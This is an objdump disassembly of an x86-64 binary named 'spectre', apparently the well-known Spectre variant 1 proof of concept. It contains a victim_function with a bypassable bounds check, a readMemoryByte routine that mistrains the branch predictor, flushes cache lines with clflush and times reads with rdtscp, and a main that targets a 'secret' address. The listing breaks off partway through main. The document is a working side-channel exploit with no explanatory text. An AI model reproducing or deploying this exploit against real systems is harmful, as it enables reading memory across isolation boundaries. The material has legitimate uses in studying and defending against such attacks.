
spectre:     file format elf64-x86-64


Disassembly of section .init:

00000000000005f8 <_init>:
 5f8:	48 83 ec 08          	sub    $0x8,%rsp
 5fc:	48 8b 05 e5 19 20 00 	mov    0x2019e5(%rip),%rax        # 201fe8 <__gmon_start__>
 603:	48 85 c0             	test   %rax,%rax
 606:	74 02                	je     60a <_init+0x12>
 608:	ff d0                	callq  *%rax
 60a:	48 83 c4 08          	add    $0x8,%rsp
 60e:	c3                   	retq   

Disassembly of section .plt:

0000000000000610 <.plt>:
 610:	ff 35 92 19 20 00    	pushq  0x201992(%rip)        # 201fa8 <_GLOBAL_OFFSET_TABLE_+0x8>
 616:	ff 25 94 19 20 00    	jmpq   *0x201994(%rip)        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x10>
 61c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000620 <putchar@plt>:
 620:	ff 25 92 19 20 00    	jmpq   *0x201992(%rip)        # 201fb8 <putchar@GLIBC_2.2.5>
 626:	68 00 00 00 00       	pushq  $0x0
 62b:	e9 e0 ff ff ff       	jmpq   610 <.plt>

0000000000000630 <__stack_chk_fail@plt>:
 630:	ff 25 8a 19 20 00    	jmpq   *0x20198a(%rip)        # 201fc0 <__stack_chk_fail@GLIBC_2.4>
 636:	68 01 00 00 00       	pushq  $0x1
 63b:	e9 d0 ff ff ff       	jmpq   610 <.plt>

0000000000000640 <printf@plt>:
 640:	ff 25 82 19 20 00    	jmpq   *0x201982(%rip)        # 201fc8 <printf@GLIBC_2.2.5>
 646:	68 02 00 00 00       	pushq  $0x2
 64b:	e9 c0 ff ff ff       	jmpq   610 <.plt>

0000000000000650 <__isoc99_sscanf@plt>:
 650:	ff 25 7a 19 20 00    	jmpq   *0x20197a(%rip)        # 201fd0 <__isoc99_sscanf@GLIBC_2.7>
 656:	68 03 00 00 00       	pushq  $0x3
 65b:	e9 b0 ff ff ff       	jmpq   610 <.plt>

Disassembly of section .plt.got:

0000000000000660 <__cxa_finalize@plt>:
 660:	ff 25 92 19 20 00    	jmpq   *0x201992(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 666:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000670 <_start>:
 670:	31 ed                	xor    %ebp,%ebp
 672:	49 89 d1             	mov    %rdx,%r9
 675:	5e                   	pop    %rsi
 676:	48 89 e2             	mov    %rsp,%rdx
 679:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 67d:	50                   	push   %rax
 67e:	54                   	push   %rsp
 67f:	4c 8d 05 3a 07 00 00 	lea    0x73a(%rip),%r8        # dc0 <__libc_csu_fini>
 686:	48 8d 0d c3 06 00 00 	lea    0x6c3(%rip),%rcx        # d50 <__libc_csu_init>
 68d:	48 8d 3d cc 04 00 00 	lea    0x4cc(%rip),%rdi        # b60 <main>
 694:	ff 15 46 19 20 00    	callq  *0x201946(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 69a:	f4                   	hlt    
 69b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000006a0 <deregister_tm_clones>:
 6a0:	48 8d 3d 41 1a 20 00 	lea    0x201a41(%rip),%rdi        # 2020e8 <__TMC_END__>
 6a7:	55                   	push   %rbp
 6a8:	48 8d 05 39 1a 20 00 	lea    0x201a39(%rip),%rax        # 2020e8 <__TMC_END__>
 6af:	48 39 f8             	cmp    %rdi,%rax
 6b2:	48 89 e5             	mov    %rsp,%rbp
 6b5:	74 19                	je     6d0 <deregister_tm_clones+0x30>
 6b7:	48 8b 05 1a 19 20 00 	mov    0x20191a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 6be:	48 85 c0             	test   %rax,%rax
 6c1:	74 0d                	je     6d0 <deregister_tm_clones+0x30>
 6c3:	5d                   	pop    %rbp
 6c4:	ff e0                	jmpq   *%rax
 6c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 6cd:	00 00 00 
 6d0:	5d                   	pop    %rbp
 6d1:	c3                   	retq   
 6d2:	0f 1f 40 00          	nopl   0x0(%rax)
 6d6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 6dd:	00 00 00 

00000000000006e0 <register_tm_clones>:
 6e0:	48 8d 3d 01 1a 20 00 	lea    0x201a01(%rip),%rdi        # 2020e8 <__TMC_END__>
 6e7:	48 8d 35 fa 19 20 00 	lea    0x2019fa(%rip),%rsi        # 2020e8 <__TMC_END__>
 6ee:	55                   	push   %rbp
 6ef:	48 29 fe             	sub    %rdi,%rsi
 6f2:	48 89 e5             	mov    %rsp,%rbp
 6f5:	48 c1 fe 03          	sar    $0x3,%rsi
 6f9:	48 89 f0             	mov    %rsi,%rax
 6fc:	48 c1 e8 3f          	shr    $0x3f,%rax
 700:	48 01 c6             	add    %rax,%rsi
 703:	48 d1 fe             	sar    %rsi
 706:	74 18                	je     720 <register_tm_clones+0x40>
 708:	48 8b 05 e1 18 20 00 	mov    0x2018e1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 70f:	48 85 c0             	test   %rax,%rax
 712:	74 0c                	je     720 <register_tm_clones+0x40>
 714:	5d                   	pop    %rbp
 715:	ff e0                	jmpq   *%rax
 717:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 71e:	00 00 
 720:	5d                   	pop    %rbp
 721:	c3                   	retq   
 722:	0f 1f 40 00          	nopl   0x0(%rax)
 726:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 72d:	00 00 00 

0000000000000730 <__do_global_dtors_aux>:
 730:	80 3d c9 19 20 00 00 	cmpb   $0x0,0x2019c9(%rip)        # 202100 <completed.7697>
 737:	75 2f                	jne    768 <__do_global_dtors_aux+0x38>
 739:	48 83 3d b7 18 20 00 	cmpq   $0x0,0x2018b7(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 740:	00 
 741:	55                   	push   %rbp
 742:	48 89 e5             	mov    %rsp,%rbp
 745:	74 0c                	je     753 <__do_global_dtors_aux+0x23>
 747:	48 8b 3d ba 18 20 00 	mov    0x2018ba(%rip),%rdi        # 202008 <__dso_handle>
 74e:	e8 0d ff ff ff       	callq  660 <__cxa_finalize@plt>
 753:	e8 48 ff ff ff       	callq  6a0 <deregister_tm_clones>
 758:	c6 05 a1 19 20 00 01 	movb   $0x1,0x2019a1(%rip)        # 202100 <completed.7697>
 75f:	5d                   	pop    %rbp
 760:	c3                   	retq   
 761:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 768:	f3 c3                	repz retq 
 76a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000770 <frame_dummy>:
 770:	55                   	push   %rbp
 771:	48 89 e5             	mov    %rsp,%rbp
 774:	5d                   	pop    %rbp
 775:	e9 66 ff ff ff       	jmpq   6e0 <register_tm_clones>

000000000000077a <victim_function>:
 77a:	55                   	push   %rbp
 77b:	48 89 e5             	mov    %rsp,%rbp
 77e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 782:	8b 05 98 18 20 00    	mov    0x201898(%rip),%eax        # 202020 <array1_size>
 788:	89 c0                	mov    %eax,%eax
 78a:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 78e:	73 34                	jae    7c4 <victim_function+0x4a>
 790:	48 8d 15 a9 18 20 00 	lea    0x2018a9(%rip),%rdx        # 202040 <array1>
 797:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 79b:	48 01 d0             	add    %rdx,%rax
 79e:	0f b6 00             	movzbl (%rax),%eax
 7a1:	0f b6 c0             	movzbl %al,%eax
 7a4:	c1 e0 09             	shl    $0x9,%eax
 7a7:	48 63 d0             	movslq %eax,%rdx
 7aa:	48 8d 05 cf 1d 20 00 	lea    0x201dcf(%rip),%rax        # 202580 <array2>
 7b1:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 7b5:	0f b6 05 64 19 20 00 	movzbl 0x201964(%rip),%eax        # 202120 <temp>
 7bc:	21 d0                	and    %edx,%eax
 7be:	88 05 5c 19 20 00    	mov    %al,0x20195c(%rip)        # 202120 <temp>
 7c4:	90                   	nop
 7c5:	5d                   	pop    %rbp
 7c6:	c3                   	retq   

00000000000007c7 <readMemoryByte>:
 7c7:	55                   	push   %rbp
 7c8:	48 89 e5             	mov    %rsp,%rbp
 7cb:	53                   	push   %rbx
 7cc:	48 83 ec 58          	sub    $0x58,%rsp
 7d0:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
 7d4:	48 89 75 a8          	mov    %rsi,-0x58(%rbp)
 7d8:	48 89 55 a0          	mov    %rdx,-0x60(%rbp)
 7dc:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
 7e3:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
 7ea:	eb 1f                	jmp    80b <readMemoryByte+0x44>
 7ec:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 7ef:	48 98                	cltq   
 7f1:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 7f8:	00 
 7f9:	48 8d 05 40 19 20 00 	lea    0x201940(%rip),%rax        # 202140 <results.23457>
 800:	c7 04 02 00 00 00 00 	movl   $0x0,(%rdx,%rax,1)
 807:	83 45 c4 01          	addl   $0x1,-0x3c(%rbp)
 80b:	81 7d c4 ff 00 00 00 	cmpl   $0xff,-0x3c(%rbp)
 812:	7e d8                	jle    7ec <readMemoryByte+0x25>
 814:	c7 45 c0 e7 03 00 00 	movl   $0x3e7,-0x40(%rbp)
 81b:	e9 c9 02 00 00       	jmpq   ae9 <readMemoryByte+0x322>
 820:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
 827:	eb 22                	jmp    84b <readMemoryByte+0x84>
 829:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 82c:	c1 e0 09             	shl    $0x9,%eax
 82f:	48 63 d0             	movslq %eax,%rdx
 832:	48 8d 05 47 1d 20 00 	lea    0x201d47(%rip),%rax        # 202580 <array2>
 839:	48 01 d0             	add    %rdx,%rax
 83c:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 840:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 844:	0f ae 38             	clflush (%rax)
 847:	83 45 c4 01          	addl   $0x1,-0x3c(%rbp)
 84b:	81 7d c4 ff 00 00 00 	cmpl   $0xff,-0x3c(%rbp)
 852:	7e d5                	jle    829 <readMemoryByte+0x62>
 854:	8b 45 c0             	mov    -0x40(%rbp),%eax
 857:	8b 0d c3 17 20 00    	mov    0x2017c3(%rip),%ecx        # 202020 <array1_size>
 85d:	ba 00 00 00 00       	mov    $0x0,%edx
 862:	f7 f1                	div    %ecx
 864:	89 d0                	mov    %edx,%eax
 866:	89 c0                	mov    %eax,%eax
 868:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
 86c:	c7 45 c8 1d 00 00 00 	movl   $0x1d,-0x38(%rbp)
 873:	e9 88 00 00 00       	jmpq   900 <readMemoryByte+0x139>
 878:	48 8d 05 a1 17 20 00 	lea    0x2017a1(%rip),%rax        # 202020 <array1_size>
 87f:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 883:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 887:	0f ae 38             	clflush (%rax)
 88a:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%rbp)
 891:	eb 09                	jmp    89c <readMemoryByte+0xd5>
 893:	8b 45 bc             	mov    -0x44(%rbp),%eax
 896:	83 c0 01             	add    $0x1,%eax
 899:	89 45 bc             	mov    %eax,-0x44(%rbp)
 89c:	8b 45 bc             	mov    -0x44(%rbp),%eax
 89f:	83 f8 63             	cmp    $0x63,%eax
 8a2:	7e ef                	jle    893 <readMemoryByte+0xcc>
 8a4:	8b 4d c8             	mov    -0x38(%rbp),%ecx
 8a7:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
 8ac:	89 c8                	mov    %ecx,%eax
 8ae:	f7 ea                	imul   %edx
 8b0:	89 c8                	mov    %ecx,%eax
 8b2:	c1 f8 1f             	sar    $0x1f,%eax
 8b5:	29 c2                	sub    %eax,%edx
 8b7:	89 d0                	mov    %edx,%eax
 8b9:	01 c0                	add    %eax,%eax
 8bb:	01 d0                	add    %edx,%eax
 8bd:	01 c0                	add    %eax,%eax
 8bf:	29 c1                	sub    %eax,%ecx
 8c1:	89 ca                	mov    %ecx,%edx
 8c3:	8d 42 ff             	lea    -0x1(%rdx),%eax
 8c6:	66 b8 00 00          	mov    $0x0,%ax
 8ca:	48 98                	cltq   
 8cc:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 8d0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 8d4:	48 c1 e8 10          	shr    $0x10,%rax
 8d8:	48 09 45 e0          	or     %rax,-0x20(%rbp)
 8dc:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
 8e0:	48 33 45 d8          	xor    -0x28(%rbp),%rax
 8e4:	48 23 45 e0          	and    -0x20(%rbp),%rax
 8e8:	48 33 45 d8          	xor    -0x28(%rbp),%rax
 8ec:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 8f0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 8f4:	48 89 c7             	mov    %rax,%rdi
 8f7:	e8 7e fe ff ff       	callq  77a <victim_function>
 8fc:	83 6d c8 01          	subl   $0x1,-0x38(%rbp)
 900:	83 7d c8 00          	cmpl   $0x0,-0x38(%rbp)
 904:	0f 89 6e ff ff ff    	jns    878 <readMemoryByte+0xb1>
 90a:	c7 45 c4 01 00 00 00 	movl   $0x1,-0x3c(%rbp)
 911:	e9 a6 00 00 00       	jmpq   9bc <readMemoryByte+0x1f5>
 916:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 919:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 91f:	83 c0 0d             	add    $0xd,%eax
 922:	25 ff 00 00 00       	and    $0xff,%eax
 927:	89 45 d4             	mov    %eax,-0x2c(%rbp)
 92a:	bb 00 00 00 00       	mov    $0x0,%ebx
 92f:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 932:	c1 e0 09             	shl    $0x9,%eax
 935:	48 63 d0             	movslq %eax,%rdx
 938:	48 8d 05 41 1c 20 00 	lea    0x201c41(%rip),%rax        # 202580 <array2>
 93f:	48 01 d0             	add    %rdx,%rax
 942:	48 89 c3             	mov    %rax,%rbx
 945:	0f ae f0             	mfence 
 948:	0f 01 f9             	rdtscp 
 94b:	49 89 c2             	mov    %rax,%r10
 94e:	48 8b 0b             	mov    (%rbx),%rcx
 951:	0f 01 f9             	rdtscp 
 954:	4c 29 d0             	sub    %r10,%rax
 957:	48 89 c3             	mov    %rax,%rbx
 95a:	48 83 fb 50          	cmp    $0x50,%rbx
 95e:	77 58                	ja     9b8 <readMemoryByte+0x1f1>
 960:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 963:	8b 0d b7 16 20 00    	mov    0x2016b7(%rip),%ecx        # 202020 <array1_size>
 969:	ba 00 00 00 00       	mov    $0x0,%edx
 96e:	f7 f1                	div    %ecx
 970:	89 d0                	mov    %edx,%eax
 972:	89 c2                	mov    %eax,%edx
 974:	48 8d 05 c5 16 20 00 	lea    0x2016c5(%rip),%rax        # 202040 <array1>
 97b:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
 97f:	0f b6 c0             	movzbl %al,%eax
 982:	39 45 d4             	cmp    %eax,-0x2c(%rbp)
 985:	74 31                	je     9b8 <readMemoryByte+0x1f1>
 987:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 98a:	48 98                	cltq   
 98c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 993:	00 
 994:	48 8d 05 a5 17 20 00 	lea    0x2017a5(%rip),%rax        # 202140 <results.23457>
 99b:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 99e:	8d 48 01             	lea    0x1(%rax),%ecx
 9a1:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 9a4:	48 98                	cltq   
 9a6:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9ad:	00 
 9ae:	48 8d 05 8b 17 20 00 	lea    0x20178b(%rip),%rax        # 202140 <results.23457>
 9b5:	89 0c 02             	mov    %ecx,(%rdx,%rax,1)
 9b8:	83 45 c4 01          	addl   $0x1,-0x3c(%rbp)
 9bc:	81 7d c4 ff 00 00 00 	cmpl   $0xff,-0x3c(%rbp)
 9c3:	0f 8e 4d ff ff ff    	jle    916 <readMemoryByte+0x14f>
 9c9:	c7 45 cc ff ff ff ff 	movl   $0xffffffff,-0x34(%rbp)
 9d0:	8b 45 cc             	mov    -0x34(%rbp),%eax
 9d3:	89 45 c8             	mov    %eax,-0x38(%rbp)
 9d6:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
 9dd:	e9 88 00 00 00       	jmpq   a6a <readMemoryByte+0x2a3>
 9e2:	83 7d c8 00          	cmpl   $0x0,-0x38(%rbp)
 9e6:	78 32                	js     a1a <readMemoryByte+0x253>
 9e8:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 9eb:	48 98                	cltq   
 9ed:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9f4:	00 
 9f5:	48 8d 05 44 17 20 00 	lea    0x201744(%rip),%rax        # 202140 <results.23457>
 9fc:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 9ff:	8b 45 c8             	mov    -0x38(%rbp),%eax
 a02:	48 98                	cltq   
 a04:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 a0b:	00 
 a0c:	48 8d 05 2d 17 20 00 	lea    0x20172d(%rip),%rax        # 202140 <results.23457>
 a13:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 a16:	39 c2                	cmp    %eax,%edx
 a18:	7c 0e                	jl     a28 <readMemoryByte+0x261>
 a1a:	8b 45 c8             	mov    -0x38(%rbp),%eax
 a1d:	89 45 cc             	mov    %eax,-0x34(%rbp)
 a20:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 a23:	89 45 c8             	mov    %eax,-0x38(%rbp)
 a26:	eb 3e                	jmp    a66 <readMemoryByte+0x29f>
 a28:	83 7d cc 00          	cmpl   $0x0,-0x34(%rbp)
 a2c:	78 32                	js     a60 <readMemoryByte+0x299>
 a2e:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 a31:	48 98                	cltq   
 a33:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a3a:	00 
 a3b:	48 8d 05 fe 16 20 00 	lea    0x2016fe(%rip),%rax        # 202140 <results.23457>
 a42:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 a45:	8b 45 cc             	mov    -0x34(%rbp),%eax
 a48:	48 98                	cltq   
 a4a:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 a51:	00 
 a52:	48 8d 05 e7 16 20 00 	lea    0x2016e7(%rip),%rax        # 202140 <results.23457>
 a59:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 a5c:	39 c2                	cmp    %eax,%edx
 a5e:	7c 06                	jl     a66 <readMemoryByte+0x29f>
 a60:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 a63:	89 45 cc             	mov    %eax,-0x34(%rbp)
 a66:	83 45 c4 01          	addl   $0x1,-0x3c(%rbp)
 a6a:	81 7d c4 ff 00 00 00 	cmpl   $0xff,-0x3c(%rbp)
 a71:	0f 8e 6b ff ff ff    	jle    9e2 <readMemoryByte+0x21b>
 a77:	8b 45 c8             	mov    -0x38(%rbp),%eax
 a7a:	48 98                	cltq   
 a7c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a83:	00 
 a84:	48 8d 05 b5 16 20 00 	lea    0x2016b5(%rip),%rax        # 202140 <results.23457>
 a8b:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 a8e:	8b 45 cc             	mov    -0x34(%rbp),%eax
 a91:	48 98                	cltq   
 a93:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 a9a:	00 
 a9b:	48 8d 05 9e 16 20 00 	lea    0x20169e(%rip),%rax        # 202140 <results.23457>
 aa2:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 aa5:	01 c0                	add    %eax,%eax
 aa7:	83 c0 05             	add    $0x5,%eax
 aaa:	39 c2                	cmp    %eax,%edx
 aac:	7d 45                	jge    af3 <readMemoryByte+0x32c>
 aae:	8b 45 c8             	mov    -0x38(%rbp),%eax
 ab1:	48 98                	cltq   
 ab3:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 aba:	00 
 abb:	48 8d 05 7e 16 20 00 	lea    0x20167e(%rip),%rax        # 202140 <results.23457>
 ac2:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 ac5:	83 f8 02             	cmp    $0x2,%eax
 ac8:	75 1b                	jne    ae5 <readMemoryByte+0x31e>
 aca:	8b 45 cc             	mov    -0x34(%rbp),%eax
 acd:	48 98                	cltq   
 acf:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 ad6:	00 
 ad7:	48 8d 05 62 16 20 00 	lea    0x201662(%rip),%rax        # 202140 <results.23457>
 ade:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 ae1:	85 c0                	test   %eax,%eax
 ae3:	74 0e                	je     af3 <readMemoryByte+0x32c>
 ae5:	83 6d c0 01          	subl   $0x1,-0x40(%rbp)
 ae9:	83 7d c0 00          	cmpl   $0x0,-0x40(%rbp)
 aed:	0f 8f 2d fd ff ff    	jg     820 <readMemoryByte+0x59>
 af3:	8b 05 47 16 20 00    	mov    0x201647(%rip),%eax        # 202140 <results.23457>
 af9:	33 45 d0             	xor    -0x30(%rbp),%eax
 afc:	89 05 3e 16 20 00    	mov    %eax,0x20163e(%rip)        # 202140 <results.23457>
 b02:	8b 45 c8             	mov    -0x38(%rbp),%eax
 b05:	89 c2                	mov    %eax,%edx
 b07:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
 b0b:	88 10                	mov    %dl,(%rax)
 b0d:	8b 45 c8             	mov    -0x38(%rbp),%eax
 b10:	48 98                	cltq   
 b12:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b19:	00 
 b1a:	48 8d 05 1f 16 20 00 	lea    0x20161f(%rip),%rax        # 202140 <results.23457>
 b21:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 b24:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
 b28:	89 10                	mov    %edx,(%rax)
 b2a:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
 b2e:	48 83 c0 01          	add    $0x1,%rax
 b32:	8b 55 cc             	mov    -0x34(%rbp),%edx
 b35:	88 10                	mov    %dl,(%rax)
 b37:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
 b3b:	48 8d 50 04          	lea    0x4(%rax),%rdx
 b3f:	8b 45 cc             	mov    -0x34(%rbp),%eax
 b42:	48 98                	cltq   
 b44:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 b4b:	00 
 b4c:	48 8d 05 ed 15 20 00 	lea    0x2015ed(%rip),%rax        # 202140 <results.23457>
 b53:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 b56:	89 02                	mov    %eax,(%rdx)
 b58:	90                   	nop
 b59:	48 83 c4 58          	add    $0x58,%rsp
 b5d:	5b                   	pop    %rbx
 b5e:	5d                   	pop    %rbp
 b5f:	c3                   	retq   

0000000000000b60 <main>:
 b60:	55                   	push   %rbp
 b61:	48 89 e5             	mov    %rsp,%rbp
 b64:	48 83 ec 40          	sub    $0x40,%rsp
 b68:	89 7d cc             	mov    %edi,-0x34(%rbp)
 b6b:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
 b6f:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 b76:	00 00 
 b78:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 b7c:	31 c0                	xor    %eax,%eax
 b7e:	48 8b 05 5b 15 20 00 	mov    0x20155b(%rip),%rax        # 2020e0 <secret>
 b85:	48 89 c2             	mov    %rax,%rdx
 b88:	48 8d 05 b1 14 20 00 	lea    0x2014b1(%rip),%rax        # 202040 <array1>
 b8f:	48 29 c2             	sub    %rax,%rdx
 b92:	48 89 d0             	mov    %rdx,%rax
 b95:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 b99:	c7 45 d8 28 00 00 00 	movl   $0x28,-0x28(%rbp)
 ba0:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
 ba7:	eb 15                	jmp    bbe <main+0x5e>
 ba9:	8b 45 dc             	mov    -0x24(%rbp),%eax
 bac:	48 63 d0             	movslq %eax,%rdx
 baf:	48 8d 05 ca 19 20 00 	lea    0x2019ca(%rip),%rax        # 202580 <array2>
 bb6:	c6 04 02 01          	movb   $0x1,(%rdx,%rax,1)
 bba:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
 bbe:	8b 45 dc             	mov    -0x24(%rbp),%eax
 bc1:	3d ff ff 01 00       	cmp    $0x1ffff,%eax
 bc6:	76 e1                	jbe    ba9 <main+0x49>
 bc8:	83 7d cc 03          	cmpl   $0x3,-0x34(%rbp)
 bcc:	75 5b                	jne    c29 <main+0xc9>
 bce:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
 bd2:	48 83 c0 08          	add    $0x8,%rax
 bd6:	48 8b 00             	mov    (%rax),%rax
 bd9:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
 bdd:	48 8d 35 1d 02 00 00 	lea    0x21d(%rip),%rsi        # e01 <_IO_stdin_used+0x31>
 be4:	48 89 c7             	mov    %rax,%rdi
 be7:	b8 00 00 00 00       	mov    $0x0,%eax
 bec:	e8 5f fa ff ff       	callq  650 <__isoc99_sscanf@plt>
 bf1:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
 bf5:	48 8d 05 44 14 20 00 	lea    0x201444(%rip),%rax        # 202040 <array1>
 bfc:	48 29 c2             	sub    %rax,%rdx
 bff:	48 89 d0             	mov    %rdx,%rax
 c02:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 c06:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
 c0a:	48 83 c0 10          	add    $0x10,%rax
 c0e:	48 8b 00             	mov    (%rax),%rax
 c11:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
 c15:	48 8d 35 e8 01 00 00 	lea    0x1e8(%rip),%rsi        # e04 <_IO_stdin_used+0x34>
 c1c:	48 89 c7             	mov    %rax,%rdi
 c1f:	b8 00 00 00 00       	mov    $0x0,%eax
 c24:	e8 27 fa ff ff       	callq  650 <__isoc99_sscanf@plt>
 c29:	8b 45 d8             	mov    -0x28(%rbp),%eax
 c2c:	89 c6                	mov    %eax,%esi
 c2e:	48 8d 3d d2 01 00 00 	lea    0x1d2(%rip),%rdi        # e07 <_IO_stdin_used+0x37>
 c35:	b8 00 00 00 00       	mov    $0x0,%eax
 c3a:	e8 01 fa ff ff       	callq  640 <printf@plt>
 c3f:	e9 d2 00 00 00       	jmpq   d16 <main+0x1b6>
 c44:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 c48:	48 89 c6             	mov    %rax,%rsi
 c4b:	48 8d 3d ce 01 00 00 	lea    0x1ce(%rip),%rdi        # e20 <_IO_stdin_used+0x50>
 c52:	b8 00 00 00 00       	mov    $0x0,%eax
 c57:	e8 e4 f9 ff ff       	callq  640 <printf@plt>
 c5c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 c60:	48 8d 50 01          	lea    0x1(%rax),%rdx
 c64:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
 c68:	48 8d 55 ec          	lea    -0x14(%rbp),%rdx
 c6c:	48 8d 4d f6          	lea    -0xa(%rbp),%rcx
 c70:	48 89 ce             	mov    %rcx,%rsi
 c73:	48 89 c7             	mov    %rax,%rdi
 c76:	e8 4c fb ff ff       	callq  7c7 <readMemoryByte>
 c7b:	8b 45 ec             	mov    -0x14(%rbp),%eax
 c7e:	8b 55 f0             	mov    -0x10(%rbp),%edx
 c81:	01 d2                	add    %edx,%edx
 c83:	39 d0                	cmp    %edx,%eax
 c85:	7c 09                	jl     c90 <main+0x130>
 c87:	48 8d 05 b2 01 00 00 	lea    0x1b2(%rip),%rax        # e40 <_IO_stdin_used+0x70>
 c8e:	eb 07                	jmp    c97 <main+0x137>
 c90:	48 8d 05 b1 01 00 00 	lea    0x1b1(%rip),%rax        # e48 <_IO_stdin_used+0x78>
 c97:	48 89 c6             	mov    %rax,%rsi
 c9a:	48 8d 3d af 01 00 00 	lea    0x1af(%rip),%rdi        # e50 <_IO_stdin_used+0x80>
 ca1:	b8 00 00 00 00       	mov    $0x0,%eax
 ca6:	e8 95 f9 ff ff       	callq  640 <printf@plt>
 cab:	8b 55 ec             	mov    -0x14(%rbp),%edx
 cae:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 cb2:	3c 1f                	cmp    $0x1f,%al
 cb4:	76 11                	jbe    cc7 <main+0x167>
 cb6:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 cba:	3c 7e                	cmp    $0x7e,%al
 cbc:	77 09                	ja     cc7 <main+0x167>
 cbe:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 cc2:	0f b6 c0             	movzbl %al,%eax
 cc5:	eb 05                	jmp    ccc <main+0x16c>
 cc7:	b8 3f 00 00 00       	mov    $0x3f,%eax
 ccc:	0f b6 4d f6          	movzbl -0xa(%rbp),%ecx
 cd0:	0f b6 f1             	movzbl %cl,%esi
 cd3:	89 d1                	mov    %edx,%ecx
